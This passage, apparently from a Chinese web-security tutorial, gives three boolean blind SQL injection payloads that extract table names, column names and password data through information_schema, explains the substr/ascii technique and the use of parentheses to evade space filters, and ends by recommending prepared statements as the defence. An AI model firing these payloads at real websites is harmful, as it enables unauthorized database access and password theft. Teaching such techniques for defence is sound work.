```
爆表名1'^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>1)^1%23爆列名1'^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name="users")),1,1))>1)^1%23爆数据1'^(ascii(substr((select(group_concat(password))from(users)),1,1))>1))^1%23
```

`substr()`函数用来获取指定位的字符，`ascii()`函数用来将指定字符转化为对应的ASCII码值，有时候后台也会将空格过滤，因此这里均用`()`来代替，其他的，还是一样，利用`database()`函数获取当前正在使用的数据库，接着在`information_schema`数据库的tables表，columns表里爆表名，爆列名，最后一位一位爆数据。

#   

在web安全中，所有注入类的问题感觉都可以归结于数据与代码的混合，因为将数据段和代码段混淆，所以才会出现这么多安全问题。因此，虽然sql注入很强大，但防范却也很简单，只需要在对SQL语句进行预编译即可，也就是代码段和数据段分别发送给数据库，这是一个非常有效的防范SQL注入的方式，效果比黑白名单要好很多，这点，从 Java Web上可以看出。
